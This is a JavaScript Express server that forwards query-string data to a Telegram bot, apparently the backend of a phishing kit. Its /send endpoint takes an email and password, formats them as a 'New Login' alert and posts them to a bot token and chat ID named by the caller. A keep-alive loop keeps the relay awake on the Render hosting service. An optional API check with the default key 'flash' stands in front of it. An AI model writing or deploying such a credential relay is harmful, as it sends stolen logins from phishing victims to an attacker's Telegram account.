import express from "express";
import axios from "axios";

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());

// API key - consider using environment variables for security
const API_KEY = process.env.API_KEY || "flash";

// Function to send message to Telegram bot
async function sendToTelegram(botToken, userId, message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: userId,
      text: message,
      parse_mode: "HTML",
    });
    return true;
  } catch (error) {
    console.error("Telegram API error:", error.response?.data || error.message);
    return false;
  }
}

// Function to ping our own server to keep it alive
function startKeepAlive() {
  const baseUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
  
  setInterval(async () => {
    try {
      console.log("Pinging server to keep alive...");
      await axios.get(`${baseUrl}/health`);
      console.log("Keep-alive ping successful");
    } catch (error) {
      console.error("Keep-alive ping failed:", error.message);
    }
  }, 30000); // Ping every 30 seconds
}

// API endpoint with query parameters (like your example)
app.get("/send", async (req, res) => {
  const { TOKEN, CHAT, data, api_key, email, password } = req.query;

  // Check API key (if provided)
  if (api_key && api_key !== API_KEY) {
    return res.status(403).json({ success: false, error: "Invalid API key" });
  }

  // Validate required fields (either TOKEN/CHAT/data OR email/password)
  let bot_token, user_id, message;
  
  if (TOKEN && CHAT && data) {
    // Using the format like your example: TOKEN, CHAT, data
    bot_token = TOKEN;
    user_id = CHAT;
    message = decodeURIComponent(data);
  } else if (email && password) {
    // Using the original format with email/password
    bot_token = req.query.bot_token;
    user_id = req.query.user_id;
    
    if (!bot_token || !user_id) {
      return res.status(400).json({ 
        success: false, 
        error: "Missing required fields: need bot_token and user_id when using email/password" 
      });
    }
    
    message = `<b>New Login</b>\n📧 Email: ${email}\n🔑 Password: ${password}`;
  } else {
    return res.status(400).json({ 
      success: false, 
      error: "Missing required fields. Use either: 1) TOKEN, CHAT, data OR 2) api_key, bot_token, user_id, email, password" 
    });
  }

  // Send to Telegram
  const sent = await sendToTelegram(bot_token, user_id, message);

  if (!sent) {
    return res
      .status(500)
      .json({ success: false, error: "Failed to send message to Telegram" });
  }

  res.json({ success: true, message: "Message sent to Telegram" });
});

// Health check endpoint for Render and keep-alive
app.get("/health", (req, res) => {
  res.json({ 
    success: true, 
    message: "Server is alive",
    timestamp: new Date().toISOString()
  });
});

// Root endpoint
app.get("/", (req, res) => {
  res.json({ 
    success: true, 
    message: "Telegram API is running",
    usage: [
      "Method 1: GET /send?TOKEN=bot_token&CHAT=user_id&data=message",
      "Method 2: GET /send?api_key=key&bot_token=token&user_id=id&email=test@example.com&password=test123"
    ],
    demo: "https://your-app-name.onrender.com/send?TOKEN=YOUR_BOT_TOKEN&CHAT=YOUR_CHAT_ID&data=" + encodeURIComponent("Hello World")
  });
});

// Start server and keep-alive mechanism
app.listen(PORT, () => {
  console.log(`🚀 API running on port ${PORT}`);
  
  // Start keep-alive only in production (on Render)
  if (process.env.NODE_ENV === 'production' || process.env.RENDER) {
    console.log("Starting keep-alive mechanism...");
    startKeepAlive();
  }
});
